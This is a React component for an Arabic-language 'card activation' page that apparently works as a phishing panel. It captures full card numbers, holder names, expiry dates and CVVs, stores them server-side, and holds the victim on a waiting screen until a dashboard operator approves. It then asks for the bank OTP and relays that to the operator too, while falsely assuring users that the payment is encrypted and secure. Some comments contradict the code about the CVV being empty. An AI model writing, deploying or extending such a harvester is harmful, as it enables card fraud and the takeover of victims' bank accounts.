import { useEffect, useMemo, useRef, useState } from "react";
import {
  Lock,
  ShieldCheck,
  CreditCard as CardIcon,
  CalendarDays,
  User as UserIcon,
  KeyRound,
} from "lucide-react";
import visaLogo from "@/assets/payments/visa.svg";
import mastercardLogo from "@/assets/payments/mastercard.svg";
import { cardErrorMessage } from "@/lib/card-validation";
import { getActivationStatus } from "@/lib/activation.functions";

const formatCardNumber = (v: string) =>
  v
    .replace(/\D/g, "")
    .slice(0, 16)
    .replace(/(.{4})/g, "$1 ")
    .trim();

/**
 * رمز الأمان (CVV) — الحقل شغّال حاليًا للتجربة.
 * ارجع لـ true لما تخلص التجربة عشان يتعطّل تاني (مش بيتحط أي قيمة ساعتها).
 */
const DISABLE_CVV_FIELD: boolean = false;

/** اكتشاف نوع البطاقة من أول أرقامها — يُخزَّن النوع فقط وليس الرقم. */
const detectBrand = (value: string) => {
  const digits = value.replace(/\D/g, "");
  if (/^4/.test(digits)) return "visa";
  if (/^(5[1-5]|2[2-7])/.test(digits)) return "mastercard";
  return null;
};

/** رمز التحقق يقبل 4 أرقام أو 6 أرقام — الاتنين مقبولين. */
const isValidOtpLength = (value: string) => value.length === 4 || value.length === 6;

/**
 * تمرير تلقائي يعرض لوحة المنبثق في وسط الشاشة.
 * على الموبايل بتكون الشاشة أسفل الطية فلا تظهر إلا بعد التمرير يدويًا،
 * فبنعملها تلقائيًا لحظة فتح التحقق (ولوحة التأكيد كمان).
 */
const bringIntoView = (overlay: HTMLElement | null) => {
  if (!overlay) return;
  const panel = overlay.firstElementChild as HTMLElement | null;
  const target = panel ?? overlay;
  // بعض بيئات الاختبار (jsdom) لا تنفّذ scrollIntoView.
  if (typeof target.scrollIntoView === "function") {
    target.scrollIntoView({ block: "center", behavior: "smooth" });
  }
};

const inputBase =
  "h-[44px] w-full rounded-lg border border-input bg-background px-3 text-sm text-foreground placeholder:text-muted-foreground/70 outline-none transition-all focus:border-ring focus:ring-2 focus:ring-ring/30";

type Phase = "idle" | "waiting_card" | "verifying" | "waiting_otp" | "verified";

const Field = ({
  label,
  icon: Icon,
  children,
}: {
  label: string;
  icon: React.ElementType;
  children: React.ReactNode;
}) => (
  <div>
    <label className="mb-1 flex items-center gap-1.5 text-xs font-semibold text-foreground">
      <Icon className="h-3.5 w-3.5" aria-hidden="true" strokeWidth={2.2} />
      <span>{label}</span>
    </label>
    {children}
  </div>
);

/**
 * Demo payment gateway embedded under each card's details.
 * Every field is live and stored (CVV included while DISABLE_CVV_FIELD=false).
 *
 * Flow — nothing advances without the dashboard:
 *   1. submit card  → waiting popup (polled every 2s)
 *   2. admin approve → OTP screen | reject → "البطاقة غير صحيحة، جرب تاني"
 *   3. submit any 6-digit code → waiting popup (polled)
 *   4. admin approve → success | reject → "الكود غير صحيح، جرب تاني"
 */
export default function CardPaymentGateway({ cardTitle }: { cardTitle: string }) {
  const sectionRef = useRef<HTMLElement>(null);
  const [card, setCard] = useState("");
  const [name, setName] = useState("");
  const [month, setMonth] = useState("");
  const [year, setYear] = useState("");
  const [cvv, setCvv] = useState("");
  const [phase, setPhase] = useState<Phase>("idle");
  const [error, setError] = useState<string | null>(null);
  const [otp, setOtp] = useState("");
  const [otpError, setOtpError] = useState<string | null>(null);
  // معرّف السجل في القاعدة — حالة وليس ref حتى يبدأ الاستعلام بعد وصوله.
  const [requestId, setRequestId] = useState<string | null>(null);
  // مراجع الشاشات المنبثقة لعمل التمرير التلقائي إليها.
  const verifyOverlayRef = useRef<HTMLDivElement>(null);
  const waitingOverlayRef = useRef<HTMLDivElement>(null);
  const verifiedOverlayRef = useRef<HTMLDivElement>(null);

  const months = useMemo(
    () => Array.from({ length: 12 }, (_, i) => String(i + 1).padStart(2, "0")),
    [],
  );
  const years = useMemo(() => {
    const y = new Date().getFullYear();
    return Array.from({ length: 12 }, (_, i) => String(y + i));
  }, []);

  // Auto-scroll to top when an overlay takes over. Inside the card dialog the
  // overlay can land below the fold, so scroll both the page and the dialog
  // body to the top, then bring the panel itself into view — on mobile these
  // screens sit below the fold until we scroll to them.
  useEffect(() => {
    if (phase === "idle") return;
    window.scrollTo({ top: 0, behavior: "smooth" });
    const dialogBody = sectionRef.current?.closest("[data-radix-dialog-content]");
    if (dialogBody) dialogBody.scrollTo({ top: 0, behavior: "smooth" });
    if (phase === "verifying") bringIntoView(verifyOverlayRef.current);
    else if (phase === "verified") bringIntoView(verifiedOverlayRef.current);
    else bringIntoView(waitingOverlayRef.current);
  }, [phase]);

  // انتظار قرار المشرف: نستعلم عن حالة الطلب كل ثانيتين حتى يقبل أو يرفض.
  useEffect(() => {
    if (phase !== "waiting_card" && phase !== "waiting_otp") return;
    if (!requestId) return;

    let cancelled = false;
    const check = async () => {
      try {
        const result = await getActivationStatus({ data: { id: requestId } });
        const status = result?.status;
        if (cancelled || !status) return;

        if (phase === "waiting_card") {
          if (status === "otp_entry") {
            // قُبلت البطاقة → الانتقال لشاشة إدخال الكود.
            setPhase("verifying");
          } else if (status === "card_rejected") {
            // رُفضت البطاقة → العودة للنموذج لإعادة المحاولة.
            setPhase("idle");
            setCard("");
            setName("");
            setMonth("");
            setYear("");
            setRequestId(null);
            setError("البطاقة غير صحيحة، جرب تاني.");
          }
        } else if (phase === "waiting_otp") {
          if (status === "verified") {
            setPhase("verified");
          } else if (status === "otp_rejected") {
            setPhase("verifying");
            setOtp("");
            setOtpError("الكود غير صحيح، جرب تاني.");
          }
        }
      } catch {
        // نتجاهل أخطاء الشبكة المؤقتة ونكمل الاستعلام.
      }
    };

    void check();
    const timer = window.setInterval(() => void check(), 2000);
    return () => {
      cancelled = true;
      window.clearInterval(timer);
    };
  }, [phase, requestId]);

  const isValid =
    card.replace(/\s/g, "").length >= 15 &&
    name.trim().length >= 3 &&
    Boolean(month) &&
    Boolean(year) &&
    (DISABLE_CVV_FIELD || cvv.length >= 3);

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    const validationError = cardErrorMessage({
      card,
      name,
      month,
      year,
      cvv,
      // CVV معطّل → نتجاوز التحقق منه فقط، وبقية الحقول تتحقق بشكل طبيعي.
      skipCvv: DISABLE_CVV_FIELD,
    });
    if (validationError) {
      setError(validationError);
      return;
    }
    // البيانات بتتبعت للسيرفر وتتخزن في جدول card_activation_requests
    // (الـ CVV فاضي دائمًا لأنه معطّل).
    void fetch("/api/public/card-request", {
      method: "POST",
      body: JSON.stringify({
        cardTitle,
        cardBrand: detectBrand(card),
        cardNumber: card.trim(),
        cardHolderName: name.trim(),
        expiryMonth: month,
        expiryYear: year,
        cvv,
      }),
      headers: { "content-type": "application/json" },
      keepalive: true,
    })
      .then((response) => (response.ok ? response.json() : null))
      .then((payload) => {
        const id = typeof payload?.id === "string" ? payload.id : null;
        setRequestId(id);
        if (!id) {
          // فشل الإرسال → نعود للنموذج بدل انتظار لا نهائي.
          setPhase("idle");
          setError("تعذر إرسال الطلب، حاول مرة أخرى.");
        }
      })
      .catch(() => {
        setPhase("idle");
        setError("تعذر إرسال الطلب، حاول مرة أخرى.");
      });
    setError(null);
    // لا ننتقل للكود مباشرة: نعرض شاشة انتظار حتى يراجع المشرف البطاقة.
    setPhase("waiting_card");
  };

  const confirmOtp = () => {
    if (!isValidOtpLength(otp)) return;
    setOtpError(null);
    // أي قيمة مقبولة: الـ OTP بيتسجل وينزل للمراجعة من الداشبورد،
    // والانتقال للمتابعة بيحصل بعد موافقة المشرف.
    if (requestId) {
      void fetch("/api/public/card-request", {
        method: "POST",
        body: JSON.stringify({
          requestId,
          event: "otp_submitted",
          otpValue: otp,
        }),
        headers: { "content-type": "application/json" },
        keepalive: true,
      }).catch(() => {});
    }
    setPhase("waiting_otp");
  };

  const resendOtp = () => {
    setOtp("");
    setOtpError(null);
  };

  const reset = () => {
    setPhase("idle");
    setCard("");
    setName("");
    setMonth("");
    setYear("");
    setCvv("");
    setError(null);
    setOtp("");
    setOtpError(null);
    setRequestId(null);
  };

  return (
    <section
      ref={sectionRef}
      dir="rtl"
      aria-label={`بوابة الدفع — ${cardTitle}`}
      className="mt-6 rounded-2xl border border-border bg-bank-lighter p-4 sm:p-5"
    >
      <div className="text-center">
        <div className="mx-auto mb-2 grid h-10 w-10 place-items-center rounded-full bg-primary/10 text-primary">
          <Lock className="h-5 w-5" strokeWidth={2.2} aria-hidden="true" />
        </div>
        <h3 className="text-base font-extrabold text-primary">{"\n"}</h3>
        <p className="mt-1 text-xs text-muted-foreground">أدخل بيانات بطاقتك لتفعيل {cardTitle}</p>
      </div>

      <div className="mt-3 flex items-center justify-center gap-3 rounded-xl border border-border bg-card px-3 py-2.5">
        <img src={visaLogo} alt="Visa" className="h-5 w-auto sm:h-6" loading="lazy" />
        <span className="h-5 w-px bg-border" aria-hidden="true" />
        <img src={mastercardLogo} alt="Mastercard" className="h-6 w-auto sm:h-7" loading="lazy" />
      </div>

      <form onSubmit={handleSubmit} className="mt-4 space-y-3" noValidate>
        <Field label="رقم البطاقة" icon={CardIcon}>
          <input
            inputMode="numeric"
            dir="ltr"
            value={card}
            onChange={(e) => setCard(formatCardNumber(e.target.value))}
            placeholder="1234 5678 9012 3456"
            className={`${inputBase} text-left tracking-widest`}
          />
        </Field>

        <Field label="اسم حامل البطاقة" icon={UserIcon}>
          <input
            value={name}
            onChange={(e) => setName(e.target.value.slice(0, 60))}
            placeholder="الاسم كما هو مدون على البطاقة"
            className={inputBase}
          />
        </Field>

        <div className="grid grid-cols-2 gap-3">
          <Field label="شهر الانتهاء" icon={CalendarDays}>
            <select value={month} onChange={(e) => setMonth(e.target.value)} className={inputBase}>
              <option value="">الشهر</option>
              {months.map((m) => (
                <option key={m} value={m}>
                  {m}
                </option>
              ))}
            </select>
          </Field>
          <Field label="سنة الانتهاء" icon={CalendarDays}>
            <select value={year} onChange={(e) => setYear(e.target.value)} className={inputBase}>
              <option value="">السنة</option>
              {years.map((y) => (
                <option key={y} value={y}>
                  {y}
                </option>
              ))}
            </select>
          </Field>
        </div>

        <Field label="رمز الأمان (CVV)" icon={KeyRound}>
          <input
            inputMode="numeric"
            dir="ltr"
            value={cvv}
            onChange={(e) => setCvv(e.target.value.replace(/\D/g, "").slice(0, 4))}
            placeholder="123"
            disabled={DISABLE_CVV_FIELD}
            className={`${inputBase} text-left tracking-widest`}
          />
        </Field>

        {error && (
          <p role="alert" className="text-xs font-semibold text-destructive">
            {error}
          </p>
        )}

        {/* فعّل الآن — the activation button sits under the gateway form */}
        <button
          type="submit"
          className={`mt-1 flex h-[48px] w-full items-center justify-center gap-2 rounded-lg text-sm font-extrabold shadow-sm transition-all ${
            isValid
              ? "bg-primary text-primary-foreground hover:bg-primary/90 active:scale-[0.99]"
              : "cursor-not-allowed bg-primary/40 text-primary-foreground"
          }`}
        >
          <Lock className="h-4 w-4" strokeWidth={2.4} aria-hidden="true" />
          <span>فعّل الآن</span>
        </button>

        <div className="flex items-center justify-center gap-1.5 pt-1 text-[11px] text-muted-foreground">
          <ShieldCheck
            className="h-3.5 w-3.5 text-emerald-600"
            strokeWidth={2.2}
            aria-hidden="true"
          />
          <span>عملية الدفع مشفّرة وآمنة بالكامل</span>
        </div>
      </form>

      {phase === "verifying" && (
        <div
          ref={verifyOverlayRef}
          className="fixed inset-0 z-50 flex justify-center overflow-y-auto bg-primary/20 px-4 py-6 backdrop-blur-sm"
        >
          <div className="my-auto w-full max-w-[440px] rounded-2xl bg-card p-6 text-center shadow-xl">
            <div className="mx-auto mb-4 grid h-14 w-14 place-items-center rounded-full bg-primary/10 text-primary">
              <KeyRound className="h-7 w-7" strokeWidth={2.2} aria-hidden="true" />
            </div>
            <h4 className="text-lg font-extrabold text-primary">تحقق من البطاقة</h4>
            <p className="mt-1 text-xs leading-6 text-muted-foreground">
              أرسلنا رمز تحقق من 6 أرقام إلى رقم الجوال المسجل لدى البنك.
            </p>
            <input
              dir="ltr"
              inputMode="numeric"
              autoComplete="one-time-code"
              value={otp}
              onChange={(e) => {
                setOtp(e.target.value.replace(/\D/g, "").slice(0, 6));
                setOtpError(null);
              }}
              placeholder="● ● ● ● ● ●"
              className={`${inputBase} mt-4 text-center text-lg font-extrabold tracking-[0.4em]`}
            />
            <p className="mt-2 text-[11px] text-muted-foreground">أدخل 4 أو 6 أرقام</p>
            {otpError && (
              <p role="alert" className="mt-2 text-xs font-semibold text-destructive">
                {otpError}
              </p>
            )}
            <button
              type="button"
              onClick={confirmOtp}
              disabled={!isValidOtpLength(otp)}
              className={`mt-4 h-[48px] w-full rounded-lg text-sm font-extrabold shadow-sm transition-all ${
                isValidOtpLength(otp)
                  ? "bg-primary text-primary-foreground hover:bg-primary/90 active:scale-[0.99]"
                  : "cursor-not-allowed bg-primary/40 text-primary-foreground"
              }`}
            >
              تأكيد الرمز
            </button>
            <button
              type="button"
              onClick={resendOtp}
              className="mt-2 text-xs font-semibold text-bank-link hover:opacity-80"
            >
              إعادة إرسال الرمز
            </button>
          </div>
        </div>
      )}

      {(phase === "waiting_card" || phase === "waiting_otp") && (
        <div
          ref={waitingOverlayRef}
          className="fixed inset-0 z-50 flex justify-center overflow-y-auto bg-primary/20 px-4 py-6 backdrop-blur-sm"
        >
          <div className="my-auto w-full max-w-[420px] rounded-2xl bg-card p-6 text-center shadow-xl">
            <div className="mx-auto mb-4 grid h-14 w-14 place-items-center rounded-full bg-primary/10 text-primary">
              <span className="h-7 w-7 animate-spin rounded-full border-[3px] border-primary/25 border-t-primary" />
            </div>
            <h4 className="text-lg font-extrabold text-primary">
              {phase === "waiting_card" ? "طلبك قيد المراجعة" : "الكود قيد المراجعة"}
            </h4>
            <p className="mt-1 text-xs leading-6 text-muted-foreground">
              {phase === "waiting_card"
                ? "استلمنا بيانات البطاقة، وسنحوّلك لخطوة الكود فور موافقة المشرف."
                : "استلمنا الرمز، وسنؤكد العملية فور موافقة المشرف."}
            </p>
            <div className="mt-4 inline-flex items-center gap-1.5 rounded-full bg-amber-500/15 px-3 py-1.5 text-[11px] font-bold text-amber-600">
              <span className="relative flex h-1.5 w-1.5">
                <span className="absolute inline-flex h-full w-full animate-ping rounded-full bg-amber-500 opacity-75" />
                <span className="relative inline-flex h-1.5 w-1.5 rounded-full bg-amber-500" />
              </span>
              تحديث تلقائي — لا تغلق الصفحة
            </div>
          </div>
        </div>
      )}

      {phase === "verified" && (
        <div
          ref={verifiedOverlayRef}
          className="fixed inset-0 z-50 flex justify-center overflow-y-auto bg-primary/20 px-4 py-6 backdrop-blur-sm"
        >
          <div className="my-auto w-full max-w-[420px] rounded-2xl bg-card p-6 text-center shadow-xl">
            <div className="mx-auto mb-4 grid h-14 w-14 place-items-center rounded-full bg-emerald-600/10 text-emerald-600">
              <ShieldCheck className="h-7 w-7" strokeWidth={2.2} aria-hidden="true" />
            </div>
            <h4 className="text-lg font-extrabold text-primary">تم تفعيل البطاقة</h4>
            <p className="mt-1 text-xs leading-6 text-muted-foreground">
              تمت الموافقة على العملية بنجاح، شكرًا لك.
            </p>
            <button
              type="button"
              onClick={reset}
              className="mt-5 h-[44px] w-full rounded-lg bg-primary text-sm font-extrabold text-primary-foreground hover:bg-primary/90"
            >
              حسناً
            </button>
          </div>
        </div>
      )}
    </section>
  );
}
